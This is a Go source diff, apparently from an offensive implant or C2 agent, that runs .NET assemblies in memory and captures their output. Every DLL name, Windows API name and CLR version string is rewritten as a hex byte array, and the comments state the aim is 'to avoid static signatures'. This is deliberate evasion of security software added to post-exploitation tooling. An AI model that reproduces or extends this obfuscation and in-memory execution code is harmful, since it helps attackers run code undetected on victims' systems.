@@ -45,41 +45,110 @@ const (
 	ERROR_NO_DATA            = 232
 )
 
-// Windows API declarations
+// DLL names (constructed to avoid static signatures)
 var (
-	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
-	ole32       = syscall.NewLazyDLL("ole32.dll")
-	user32      = syscall.NewLazyDLL("user32.dll")
-	msvcrt      = syscall.NewLazyDLL("msvcrt.dll")
+	iaDllKernel32 = string([]byte{0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})             // kernel32.dll
+	iaDllOle32    = string([]byte{0x6f, 0x6c, 0x65, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                               // ole32.dll
+	iaDllUser32   = string([]byte{0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                         // user32.dll
+	iaDllMsvcrt   = string([]byte{0x6d, 0x73, 0x76, 0x63, 0x72, 0x74, 0x2e, 0x64, 0x6c, 0x6c})                         // msvcrt.dll
+)
+
+// API function names (constructed to avoid static signatures)
+var (
+	iaFnGetStdHandle          = string([]byte{0x47, 0x65, 0x74, 0x53, 0x74, 0x64, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65})                                                 // GetStdHandle
+	iaFnSetStdHandle          = string([]byte{0x53, 0x65, 0x74, 0x53, 0x74, 0x64, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65})                                                 // SetStdHandle
+	iaFnAllocConsole          = string([]byte{0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65})                                                 // AllocConsole
+	iaFnFreeConsole           = string([]byte{0x46, 0x72, 0x65, 0x65, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65})                                                       // FreeConsole
+	iaFnGetConsoleWindow      = string([]byte{0x47, 0x65, 0x74, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77})                         // GetConsoleWindow
+	iaFnPeekNamedPipe         = string([]byte{0x50, 0x65, 0x65, 0x6b, 0x4e, 0x61, 0x6d, 0x65, 0x64, 0x50, 0x69, 0x70, 0x65})                                           // PeekNamedPipe
+	iaFnCreateFileW           = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x57})                                                       // CreateFileW
+	iaFnCreateFileA           = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x41})                                                       // CreateFileA
+	iaFnCloseHandle           = string([]byte{0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65})                                                       // CloseHandle
+	iaFnReadFile              = string([]byte{0x52, 0x65, 0x61, 0x64, 0x46, 0x69, 0x6c, 0x65})                                                                         // ReadFile
+	iaFnWriteFile             = string([]byte{0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65})                                                                   // WriteFile
+	iaFnCoInitializeEx        = string([]byte{0x43, 0x6f, 0x49, 0x6e, 0x69, 0x74, 0x69, 0x61, 0x6c, 0x69, 0x7a, 0x65, 0x45, 0x78})                                     // CoInitializeEx
+	iaFnCoUninitialize        = string([]byte{0x43, 0x6f, 0x55, 0x6e, 0x69, 0x6e, 0x69, 0x74, 0x69, 0x61, 0x6c, 0x69, 0x7a, 0x65})                                     // CoUninitialize
+	iaFnFlushInstructionCache = string([]byte{0x46, 0x6c, 0x75, 0x73, 0x68, 0x49, 0x6e, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x43, 0x61, 0x63, 0x68, 0x65}) // FlushInstructionCache
+	iaFnShowWindow            = string([]byte{0x53, 0x68, 0x6f, 0x77, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77})                                                             // ShowWindow
+	iaFnOpenOsfhandle         = string([]byte{0x5f, 0x6f, 0x70, 0x65, 0x6e, 0x5f, 0x6f, 0x73, 0x66, 0x68, 0x61, 0x6e, 0x64, 0x6c, 0x65})                               // _open_osfhandle
+	iaFnDup2                  = string([]byte{0x5f, 0x64, 0x75, 0x70, 0x32})                                                                                           // _dup2
+	iaFnClose                 = string([]byte{0x5f, 0x63, 0x6c, 0x6f, 0x73, 0x65})                                                                                     // _close
+)
+
+// CLR strings (constructed to avoid static signatures)
+var (
+	iaClrV4        = string([]byte{0x76, 0x34})                                                 // v4
+	iaClrV2        = string([]byte{0x76, 0x32})                                                 // v2
+	iaClrV2Full    = string([]byte{0x76, 0x32, 0x2e, 0x30, 0x2e, 0x35, 0x30, 0x37, 0x32, 0x37}) // v2.0.50727
+	iaTempPrefix   = string([]byte{0x63, 0x6c, 0x72, 0x5f, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x5f}) // clr_output_
+	iaTempSuffix   = string([]byte{0x2e, 0x74, 0x78, 0x74})                                     // .txt
+)
+
+// Windows API declarations (initialized in init to use hex strings)
+var (
+	kernel32DLL *syscall.LazyDLL
+	ole32       *syscall.LazyDLL
+	user32      *syscall.LazyDLL
+	msvcrt      *syscall.LazyDLL
 
 	// Console functions
-	getStdHandle     = kernel32DLL.NewProc("GetStdHandle")
-	setStdHandle     = kernel32DLL.NewProc("SetStdHandle")
-	allocConsole     = kernel32DLL.NewProc("AllocConsole")
-	freeConsole      = kernel32DLL.NewProc("FreeConsole")
-	getConsoleWindow = kernel32DLL.NewProc("GetConsoleWindow")
-	peekNamedPipe    = kernel32DLL.NewProc("PeekNamedPipe")
+	getStdHandle     *syscall.LazyProc
+	setStdHandle     *syscall.LazyProc
+	allocConsole     *syscall.LazyProc
+	freeConsole      *syscall.LazyProc
+	getConsoleWindow *syscall.LazyProc
+	peekNamedPipe    *syscall.LazyProc
 
 	// File functions
-	createFileW = kernel32DLL.NewProc("CreateFileW")
-	createFileA = kernel32DLL.NewProc("CreateFileA")
-	closeHandle = kernel32DLL.NewProc("CloseHandle")
-	readFile    = kernel32DLL.NewProc("ReadFile")
-	writeFile   = kernel32DLL.NewProc("WriteFile")
+	createFileW *syscall.LazyProc
+	createFileA *syscall.LazyProc
+	closeHandle *syscall.LazyProc
+	readFile    *syscall.LazyProc
+	writeFile   *syscall.LazyProc
 
 	// COM functions
-	coInitializeEx        = ole32.NewProc("CoInitializeEx")
-	coUninitialize        = ole32.NewProc("CoUninitialize")
-	flushInstructionCache = kernel32DLL.NewProc("FlushInstructionCache")
+	coInitializeEx        *syscall.LazyProc
+	coUninitialize        *syscall.LazyProc
+	flushInstructionCache *syscall.LazyProc
 
 	// Window functions
-	showWindow = user32.NewProc("ShowWindow")
+	showWindow *syscall.LazyProc
 
 	// CRT functions
-	openOsfhandle = msvcrt.NewProc("_open_osfhandle")
-	dup2          = msvcrt.NewProc("_dup2")
-	closeFunc     = msvcrt.NewProc("_close")
+	openOsfhandle *syscall.LazyProc
+	dup2          *syscall.LazyProc
+	closeFunc     *syscall.LazyProc
 )
+
+func init() {
+	kernel32DLL = syscall.NewLazyDLL(iaDllKernel32)
+	ole32 = syscall.NewLazyDLL(iaDllOle32)
+	user32 = syscall.NewLazyDLL(iaDllUser32)
+	msvcrt = syscall.NewLazyDLL(iaDllMsvcrt)
+
+	getStdHandle = kernel32DLL.NewProc(iaFnGetStdHandle)
+	setStdHandle = kernel32DLL.NewProc(iaFnSetStdHandle)
+	allocConsole = kernel32DLL.NewProc(iaFnAllocConsole)
+	freeConsole = kernel32DLL.NewProc(iaFnFreeConsole)
+	getConsoleWindow = kernel32DLL.NewProc(iaFnGetConsoleWindow)
+	peekNamedPipe = kernel32DLL.NewProc(iaFnPeekNamedPipe)
+
+	createFileW = kernel32DLL.NewProc(iaFnCreateFileW)
+	createFileA = kernel32DLL.NewProc(iaFnCreateFileA)
+	closeHandle = kernel32DLL.NewProc(iaFnCloseHandle)
+	readFile = kernel32DLL.NewProc(iaFnReadFile)
+	writeFile = kernel32DLL.NewProc(iaFnWriteFile)
+
+	coInitializeEx = ole32.NewProc(iaFnCoInitializeEx)
+	coUninitialize = ole32.NewProc(iaFnCoUninitialize)
+	flushInstructionCache = kernel32DLL.NewProc(iaFnFlushInstructionCache)
+
+	showWindow = user32.NewProc(iaFnShowWindow)
+
+	openOsfhandle = msvcrt.NewProc(iaFnOpenOsfhandle)
+	dup2 = msvcrt.NewProc(iaFnDup2)
+	closeFunc = msvcrt.NewProc(iaFnClose)
+}
 
 // applyTokenContextForInlineAssembly applies token context for synchronous assembly execution
 func applyTokenContextForInlineAssembly() func() {
@@ -141,7 +210,7 @@ func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, i
 
 	// Create temp file for output
 	tempDir := os.TempDir()
-	outputFile := filepath.Join(tempDir, fmt.Sprintf("clr_output_%d.txt", time.Now().UnixNano()))
+	outputFile := filepath.Join(tempDir, iaTempPrefix+fmt.Sprintf("%d", time.Now().UnixNano())+iaTempSuffix)
 
 	// Create file handle
 	outputPath, _ := syscall.UTF16PtrFromString(outputFile)
@@ -182,9 +251,9 @@ func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Detect runtime
-	targetRuntime := "v4"
-	if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
-		targetRuntime = "v2"
+	targetRuntime := iaClrV4
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
+		targetRuntime = iaClrV2
 	}
 
 	// Execute assembly
@@ -223,9 +292,9 @@ func executeWithoutCapture(assemblyBytes []byte, arguments []string) (string, in
 		defer coUninitialize.Call()
 	}
 
-	targetRuntime := "v4"
-	if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
-		targetRuntime = "v2"
+	targetRuntime := iaClrV4
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
+		targetRuntime = iaClrV2
 	}
 
 	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
@@ -321,9 +390,9 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	err := syscall.CreatePipe(&readPipe, &writePipe, nil, 1024*1024) // 1MB buffer
 	if err != nil {
 		// Detect runtime version
-		targetRuntime := "v4"
-		if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
-			targetRuntime = "v2"
+		targetRuntime := iaClrV4
+		if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
+			targetRuntime = iaClrV2
 		}
 		retCode, err := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
 		return "", int(retCode), err
@@ -362,9 +431,9 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Detect runtime version
-	targetRuntime := "v4"
-	if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
-		targetRuntime = "v2"
+	targetRuntime := iaClrV4
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
+		targetRuntime = iaClrV2
 	}
 
 	// removed debug log
@@ -448,9 +517,9 @@ func executeWithTestCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Detect runtime version
-	targetRuntime := "v4"
-	if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
-		targetRuntime = "v2"
+	targetRuntime := iaClrV4
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
+		targetRuntime = iaClrV2
 	}
 
 	// Test 1: Can we execute at all?
